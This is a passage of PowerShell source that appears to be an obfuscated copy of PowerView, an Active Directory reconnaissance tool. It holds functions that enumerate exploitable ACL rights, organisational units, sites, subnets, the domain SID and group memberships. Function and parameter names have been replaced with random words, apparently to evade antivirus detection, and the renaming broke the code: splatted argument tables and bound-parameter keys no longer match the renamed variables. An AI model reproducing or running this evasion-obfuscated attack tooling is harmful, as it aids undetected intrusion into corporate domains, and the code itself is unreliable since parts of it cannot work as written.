    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DomainName', 'Name')]
        [String]
        $JXWXuoyG99,

        [Switch]
        $GWNRyiuj99,

        [String]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $CESAUplj99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $NzjfVMfT99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $vcQqByyX99 = @{}
        if ($PSBoundParameters['ResolveGUIDs']) { $vcQqByyX99['ResolveGUIDs'] = $GWNRyiuj99 }
        if ($PSBoundParameters['RightsFilter']) { $vcQqByyX99['RightsFilter'] = $CESAUplj99 }
        if ($PSBoundParameters['LDAPFilter']) { $vcQqByyX99['LDAPFilter'] = $NzjfVMfT99 }
        if ($PSBoundParameters['SearchBase']) { $vcQqByyX99['SearchBase'] = $pQbfmzwr99 }
        if ($PSBoundParameters['Server']) { $vcQqByyX99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $vcQqByyX99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $vcQqByyX99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $vcQqByyX99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $vcQqByyX99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $vcQqByyX99['Credential'] = $tYWiEqAT99 }

        $QlYHYFNb99 = @{
            'Properties' = 'samaccountname,objectclass'
            'Raw' = $True
        }
        if ($PSBoundParameters['Server']) { $QlYHYFNb99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $QlYHYFNb99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $QlYHYFNb99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $QlYHYFNb99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $QlYHYFNb99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $QlYHYFNb99['Credential'] = $tYWiEqAT99 }

        $EWGQOOGJ99 = @{}
        if ($PSBoundParameters['Server']) { $EWGQOOGJ99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['Credential']) { $EWGQOOGJ99['Credential'] = $tYWiEqAT99 }

        $sNGxIyMf99 = @{}
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $vcQqByyX99['Domain'] = $JXWXuoyG99
            $EWGQOOGJ99['Domain'] = $JXWXuoyG99
        }

        tracery @ACLArguments | ForEach-Object {

            if ( ($_.ActiveDirectoryRights -match 'GenericAll|Write|Create|Delete') -or (($_.ActiveDirectoryRights -match 'ExtendedRight') -and ($_.AceQualifier -match 'Allow'))) {
                if ($_.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if ($sNGxIyMf99[$_.SecurityIdentifier.Value]) {
                        $rZHWEMYf99, $QuKrueJf99, $IkmVbPDe99, $voeYphEO99 = $sNGxIyMf99[$_.SecurityIdentifier.Value]

                        $EjrZNfsR99 = New-Object PSObject
                        $EjrZNfsR99 | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                        $EjrZNfsR99 | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                        $EjrZNfsR99 | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                        if ($_.ObjectAceType) {
                            $EjrZNfsR99 | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                        }
                        else {
                            $EjrZNfsR99 | Add-Member NoteProperty 'ObjectAceType' 'None'
                        }
                        $EjrZNfsR99 | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                        $EjrZNfsR99 | Add-Member NoteProperty 'AceType' $_.AceType
                        $EjrZNfsR99 | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                        $EjrZNfsR99 | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                        $EjrZNfsR99 | Add-Member NoteProperty 'IdentityReferenceName' $rZHWEMYf99
                        $EjrZNfsR99 | Add-Member NoteProperty 'IdentityReferenceDomain' $QuKrueJf99
                        $EjrZNfsR99 | Add-Member NoteProperty 'IdentityReferenceDN' $IkmVbPDe99
                        $EjrZNfsR99 | Add-Member NoteProperty 'IdentityReferenceClass' $voeYphEO99
                        $EjrZNfsR99
                    }
                    else {
                        $IkmVbPDe99 = oared -Identity $_.SecurityIdentifier.Value -OutputType DN @ADNameArguments

                        if ($IkmVbPDe99) {
                            $QuKrueJf99 = $IkmVbPDe99.SubString($IkmVbPDe99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            $QlYHYFNb99['Domain'] = $QuKrueJf99
                            $QlYHYFNb99['Identity'] = $IkmVbPDe99
                            $Object = nostrums @ObjectSearcherArguments

                            if ($Object) {
                                $rZHWEMYf99 = $Object.Properties.samaccountname[0]
                                if ($Object.Properties.objectclass -match 'computer') {
                                    $voeYphEO99 = 'computer'
                                }
                                elseif ($Object.Properties.objectclass -match 'group') {
                                    $voeYphEO99 = 'group'
                                }
                                elseif ($Object.Properties.objectclass -match 'user') {
                                    $voeYphEO99 = 'user'
                                }
                                else {
                                    $voeYphEO99 = $Null
                                }

                                $sNGxIyMf99[$_.SecurityIdentifier.Value] = $rZHWEMYf99, $QuKrueJf99, $IkmVbPDe99, $voeYphEO99

                                $EjrZNfsR99 = New-Object PSObject
                                $EjrZNfsR99 | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                                $EjrZNfsR99 | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                                $EjrZNfsR99 | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                                if ($_.ObjectAceType) {
                                    $EjrZNfsR99 | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                                }
                                else {
                                    $EjrZNfsR99 | Add-Member NoteProperty 'ObjectAceType' 'None'
                                }
                                $EjrZNfsR99 | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                                $EjrZNfsR99 | Add-Member NoteProperty 'AceType' $_.AceType
                                $EjrZNfsR99 | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                                $EjrZNfsR99 | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                                $EjrZNfsR99 | Add-Member NoteProperty 'IdentityReferenceName' $rZHWEMYf99
                                $EjrZNfsR99 | Add-Member NoteProperty 'IdentityReferenceDomain' $QuKrueJf99
                                $EjrZNfsR99 | Add-Member NoteProperty 'IdentityReferenceDN' $IkmVbPDe99
                                $EjrZNfsR99 | Add-Member NoteProperty 'IdentityReferenceClass' $voeYphEO99
                                $EjrZNfsR99
                            }
                        }
                        else {
                            Write-Warning "[Nicene] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with oared"
                        }
                    }
                }
            }
        }
    }
}


function bulldog {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $lmPsrtYT99,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $BjepgZIz99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $NzjfVMfT99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $hqDcSuel99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $kXEJXDlJ99,

        [Switch]
        $adpABMuf99,

        [Alias('ReturnOne')]
        [Switch]
        $dmDYWlHe99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $nlvvSWoK99 = @{}
        if ($PSBoundParameters['Domain']) { $nlvvSWoK99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['Properties']) { $nlvvSWoK99['Properties'] = $hqDcSuel99 }
        if ($PSBoundParameters['SearchBase']) { $nlvvSWoK99['SearchBase'] = $pQbfmzwr99 }
        if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $nlvvSWoK99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $nlvvSWoK99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['SecurityMasks']) { $nlvvSWoK99['SecurityMasks'] = $kXEJXDlJ99 }
        if ($PSBoundParameters['Tombstone']) { $nlvvSWoK99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }
        $MTofHyqf99 = misbehaves @SearcherArguments
    }

    PROCESS {
        if ($MTofHyqf99) {
            $OfuxkWWH99 = ''
            $HLDsNhab99 = ''
            $lmPsrtYT99 | Where-Object {$_} | ForEach-Object {
                $svVwDJqZ99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($svVwDJqZ99 -match '^OU=.*') {
                    $OfuxkWWH99 += "(distinguishedname=$svVwDJqZ99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $QaLnxLKT99 = $svVwDJqZ99.SubString($svVwDJqZ99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[bulldog] Extracted domain '$QaLnxLKT99' from '$svVwDJqZ99'"
                        $nlvvSWoK99['Domain'] = $QaLnxLKT99
                        $MTofHyqf99 = misbehaves @SearcherArguments
                        if (-not $MTofHyqf99) {
                            Write-Warning "[bulldog] Unable to retrieve domain searcher for '$QaLnxLKT99'"
                        }
                    }
                }
                else {
                    try {
                        $TsiMgfqm99 = (-Join (([Guid]$svVwDJqZ99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $OfuxkWWH99 += "(objectguid=$TsiMgfqm99)"
                    }
                    catch {
                        $OfuxkWWH99 += "(name=$svVwDJqZ99)"
                    }
                }
            }
            if ($OfuxkWWH99 -and ($OfuxkWWH99.Trim() -ne '') ) {
                $HLDsNhab99 += "(|$OfuxkWWH99)"
            }

            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[bulldog] Searching for OUs with $BjepgZIz99 set in the gpLink property"
                $HLDsNhab99 += "(gplink=*$BjepgZIz99*)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[bulldog] Using additional LDAP filter: $NzjfVMfT99"
                $HLDsNhab99 += "$NzjfVMfT99"
            }

            $MTofHyqf99.filter = "(&(objectCategory=organizationalUnit)$HLDsNhab99)"
            Write-Verbose "[bulldog] bulldog filter string: $($MTofHyqf99.filter)"

            if ($PSBoundParameters['FindOne']) { $DEbeunXw99 = $MTofHyqf99.FindOne() }
            else { $DEbeunXw99 = $MTofHyqf99.FindAll() }
            $DEbeunXw99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $OU = $_
                }
                else {
                    $OU = Jagger -Properties $_.Properties
                }
                $OU.PSObject.TypeNames.Insert(0, 'PowerView.OU')
                $OU
            }
            if ($DEbeunXw99) {
                try { $DEbeunXw99.dispose() }
                catch {
                    Write-Verbose "[bulldog] Error disposing of the Results object: $_"
                }
            }
            $MTofHyqf99.dispose()
        }
    }
}


function regenerate {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $lmPsrtYT99,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $BjepgZIz99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $NzjfVMfT99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $hqDcSuel99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $kXEJXDlJ99,

        [Switch]
        $adpABMuf99,

        [Alias('ReturnOne')]
        [Switch]
        $dmDYWlHe99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $nlvvSWoK99 = @{
            'SearchBasePrefix' = 'CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $nlvvSWoK99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['Properties']) { $nlvvSWoK99['Properties'] = $hqDcSuel99 }
        if ($PSBoundParameters['SearchBase']) { $nlvvSWoK99['SearchBase'] = $pQbfmzwr99 }
        if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $nlvvSWoK99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $nlvvSWoK99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['SecurityMasks']) { $nlvvSWoK99['SecurityMasks'] = $kXEJXDlJ99 }
        if ($PSBoundParameters['Tombstone']) { $nlvvSWoK99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }
        $aNXUhrTS99 = misbehaves @SearcherArguments
    }

    PROCESS {
        if ($aNXUhrTS99) {
            $OfuxkWWH99 = ''
            $HLDsNhab99 = ''
            $lmPsrtYT99 | Where-Object {$_} | ForEach-Object {
                $svVwDJqZ99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($svVwDJqZ99 -match '^CN=.*') {
                    $OfuxkWWH99 += "(distinguishedname=$svVwDJqZ99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $QaLnxLKT99 = $svVwDJqZ99.SubString($svVwDJqZ99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[regenerate] Extracted domain '$QaLnxLKT99' from '$svVwDJqZ99'"
                        $nlvvSWoK99['Domain'] = $QaLnxLKT99
                        $aNXUhrTS99 = misbehaves @SearcherArguments
                        if (-not $aNXUhrTS99) {
                            Write-Warning "[regenerate] Unable to retrieve domain searcher for '$QaLnxLKT99'"
                        }
                    }
                }
                else {
                    try {
                        $TsiMgfqm99 = (-Join (([Guid]$svVwDJqZ99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $OfuxkWWH99 += "(objectguid=$TsiMgfqm99)"
                    }
                    catch {
                        $OfuxkWWH99 += "(name=$svVwDJqZ99)"
                    }
                }
            }
            if ($OfuxkWWH99 -and ($OfuxkWWH99.Trim() -ne '') ) {
                $HLDsNhab99 += "(|$OfuxkWWH99)"
            }

            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[regenerate] Searching for sites with $BjepgZIz99 set in the gpLink property"
                $HLDsNhab99 += "(gplink=*$BjepgZIz99*)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[regenerate] Using additional LDAP filter: $NzjfVMfT99"
                $HLDsNhab99 += "$NzjfVMfT99"
            }

            $aNXUhrTS99.filter = "(&(objectCategory=site)$HLDsNhab99)"
            Write-Verbose "[regenerate] regenerate filter string: $($aNXUhrTS99.filter)"

            if ($PSBoundParameters['FindOne']) { $DEbeunXw99 = $aNXUhrTS99.FindAll() }
            else { $DEbeunXw99 = $aNXUhrTS99.FindAll() }
            $DEbeunXw99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $Site = $_
                }
                else {
                    $Site = Jagger -Properties $_.Properties
                }
                $Site.PSObject.TypeNames.Insert(0, 'PowerView.Site')
                $Site
            }
            if ($DEbeunXw99) {
                try { $DEbeunXw99.dispose() }
                catch {
                    Write-Verbose "[regenerate] Error disposing of the Results object"
                }
            }
            $aNXUhrTS99.dispose()
        }
    }
}


function hymen {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $lmPsrtYT99,

        [ValidateNotNullOrEmpty()]
        [String]
        $UHxOuyqA99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $NzjfVMfT99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $hqDcSuel99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $kXEJXDlJ99,

        [Switch]
        $adpABMuf99,

        [Alias('ReturnOne')]
        [Switch]
        $dmDYWlHe99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $nlvvSWoK99 = @{
            'SearchBasePrefix' = 'CN=Subnets,CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $nlvvSWoK99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['Properties']) { $nlvvSWoK99['Properties'] = $hqDcSuel99 }
        if ($PSBoundParameters['SearchBase']) { $nlvvSWoK99['SearchBase'] = $pQbfmzwr99 }
        if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $nlvvSWoK99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $nlvvSWoK99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['SecurityMasks']) { $nlvvSWoK99['SecurityMasks'] = $kXEJXDlJ99 }
        if ($PSBoundParameters['Tombstone']) { $nlvvSWoK99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }
        $XsxIIdBv99 = misbehaves @SearcherArguments
    }

    PROCESS {
        if ($XsxIIdBv99) {
            $OfuxkWWH99 = ''
            $HLDsNhab99 = ''
            $lmPsrtYT99 | Where-Object {$_} | ForEach-Object {
                $svVwDJqZ99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($svVwDJqZ99 -match '^CN=.*') {
                    $OfuxkWWH99 += "(distinguishedname=$svVwDJqZ99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $QaLnxLKT99 = $svVwDJqZ99.SubString($svVwDJqZ99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[hymen] Extracted domain '$QaLnxLKT99' from '$svVwDJqZ99'"
                        $nlvvSWoK99['Domain'] = $QaLnxLKT99
                        $XsxIIdBv99 = misbehaves @SearcherArguments
                        if (-not $XsxIIdBv99) {
                            Write-Warning "[hymen] Unable to retrieve domain searcher for '$QaLnxLKT99'"
                        }
                    }
                }
                else {
                    try {
                        $TsiMgfqm99 = (-Join (([Guid]$svVwDJqZ99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $OfuxkWWH99 += "(objectguid=$TsiMgfqm99)"
                    }
                    catch {
                        $OfuxkWWH99 += "(name=$svVwDJqZ99)"
                    }
                }
            }
            if ($OfuxkWWH99 -and ($OfuxkWWH99.Trim() -ne '') ) {
                $HLDsNhab99 += "(|$OfuxkWWH99)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[hymen] Using additional LDAP filter: $NzjfVMfT99"
                $HLDsNhab99 += "$NzjfVMfT99"
            }

            $XsxIIdBv99.filter = "(&(objectCategory=subnet)$HLDsNhab99)"
            Write-Verbose "[hymen] hymen filter string: $($XsxIIdBv99.filter)"

            if ($PSBoundParameters['FindOne']) { $DEbeunXw99 = $XsxIIdBv99.FindOne() }
            else { $DEbeunXw99 = $XsxIIdBv99.FindAll() }
            $DEbeunXw99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $sejmOtUd99 = $_
                }
                else {
                    $sejmOtUd99 = Jagger -Properties $_.Properties
                }
                $sejmOtUd99.PSObject.TypeNames.Insert(0, 'PowerView.Subnet')

                if ($PSBoundParameters['SiteName']) {
                    if ($sejmOtUd99.properties -and ($sejmOtUd99.properties.siteobject -like "*$UHxOuyqA99*")) {
                        $sejmOtUd99
                    }
                    elseif ($sejmOtUd99.siteobject -like "*$UHxOuyqA99*") {
                        $sejmOtUd99
                    }
                }
                else {
                    $sejmOtUd99
                }
            }
            if ($DEbeunXw99) {
                try { $DEbeunXw99.dispose() }
                catch {
                    Write-Verbose "[hymen] Error disposing of the Results object: $_"
                }
            }
            $XsxIIdBv99.dispose()
        }
    }
}


function Democrats {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    $nlvvSWoK99 = @{
        'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    if ($PSBoundParameters['Domain']) { $nlvvSWoK99['Domain'] = $JXWXuoyG99 }
    if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
    if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }

    $DCSID = undergrad @SearcherArguments -FindOne | Select-Object -First 1 -ExpandProperty objectsid

    if ($DCSID) {
        $DCSID.SubString(0, $DCSID.LastIndexOf('-'))
    }
    else {
        Write-Verbose "[Democrats] Error extracting domain SID for '$JXWXuoyG99'"
    }
}


function walnuts {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $lmPsrtYT99,

        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        $zoVtPyFW99,

        [Switch]
        $SzRgrLzc99,

        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        $OmOUYzoT99,

        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        $DFrienWm99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $NzjfVMfT99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $hqDcSuel99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $kXEJXDlJ99,

        [Switch]
        $adpABMuf99,

        [Alias('ReturnOne')]
        [Switch]
        $dmDYWlHe99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $nlvvSWoK99 = @{}
        if ($PSBoundParameters['Domain']) { $nlvvSWoK99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['Properties']) { $nlvvSWoK99['Properties'] = $hqDcSuel99 }
        if ($PSBoundParameters['SearchBase']) { $nlvvSWoK99['SearchBase'] = $pQbfmzwr99 }
        if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $nlvvSWoK99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $nlvvSWoK99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['SecurityMasks']) { $nlvvSWoK99['SecurityMasks'] = $kXEJXDlJ99 }
        if ($PSBoundParameters['Tombstone']) { $nlvvSWoK99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }
        $eHXcamlz99 = misbehaves @SearcherArguments
    }

    PROCESS {
        if ($eHXcamlz99) {
            if ($PSBoundParameters['MemberIdentity']) {

                if ($nlvvSWoK99['Properties']) {
                    $wkdNSvfa99 = $nlvvSWoK99['Properties']
                }

                $nlvvSWoK99['Identity'] = $zoVtPyFW99
                $nlvvSWoK99['Raw'] = $True

                nostrums @SearcherArguments | ForEach-Object {
                    $vsmftwow99 = $_.GetDirectoryEntry()

                    $vsmftwow99.RefreshCache('tokenGroups')

                    $vsmftwow99.TokenGroups | ForEach-Object {
                        $CpfORWIL99 = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value

                        if ($CpfORWIL99 -notmatch '^S-1-5-32-.*') {
                            $nlvvSWoK99['Identity'] = $CpfORWIL99
                            $nlvvSWoK99['Raw'] = $False
                            if ($wkdNSvfa99) { $nlvvSWoK99['Properties'] = $wkdNSvfa99 }
                            $Group = nostrums @SearcherArguments
                            if ($Group) {
                                $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                                $Group
                            }
                        }
                    }
                }
            }
            else {
                $OfuxkWWH99 = ''
                $HLDsNhab99 = ''
                $lmPsrtYT99 | Where-Object {$_} | ForEach-Object {
                    $svVwDJqZ99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($svVwDJqZ99 -match '^S-1-') {
                        $OfuxkWWH99 += "(objectsid=$svVwDJqZ99)"
                    }
                    elseif ($svVwDJqZ99 -match '^CN=') {
